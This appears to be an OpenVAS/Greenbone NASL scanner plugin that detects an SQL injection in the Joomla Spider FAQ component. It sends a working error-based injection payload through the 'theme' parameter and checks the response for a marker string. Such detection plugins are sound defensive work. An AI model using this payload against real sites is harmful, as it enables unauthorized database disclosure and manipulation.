CPE = "cpe:/a:joomla:joomla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805499" );
	script_version( "$Revision: 11323 $" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2018-09-11 12:20:18 +0200 (Tue, 11 Sep 2018) $" );
	script_tag( name: "creation_date", value: "2015-03-26 10:48:48 +0530 (Thu, 26 Mar 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "Joomla Spider-FAQ SQL Injection Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Joomla Spider FAQ component and is prone to sql
injection vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and check whether it is able to execute
sql query or not." );
	script_tag( name: "insight", value: "Flaw is due to joomla component Spider FAQ is not filtering data in 'theme'
and 'Itemid' parameters." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to inject or manipulate
SQL queries in the back-end database, allowing for the manipulation or disclosure of arbitrary data." );
	script_tag( name: "affected", value: "Joomla Spider FAQ component." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36464" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/130962" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "joomla_detect.sc" );
	script_mandatory_keys( "joomla/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/index.php?option=com_spiderfaq&view=spiderfaqmultiple&standcat=0" + "&faq_cats=,2,3,&standcatids=&theme=4%20and%28select%201%20" + "FROM%28select%20count%28*%29,concat%28%28select%20%28select%20concat%28user" + "%28%29,SQL-INJECTION-TEST40,x27,0x7e%29%29%20FROM%20information_schem" + "a.tables%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20FROM%20information" + "_schema.tables%20GROUP%20BY%20x%29a%29--%20-%20&searchform=1&expand=0&Itemid=109";
host = http_host_name( port: http_port );
req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\\r\\n" );
res = http_keepalive_send_recv( port: http_port, data: req );
if(res && ContainsString( res, "SQL-INJECTION-TEST" ) && ContainsString( res, ">Error:" ) && ContainsString( res, "spiderfaq" )){
	security_message( port: http_port );
	exit( 0 );
}
exit( 99 );

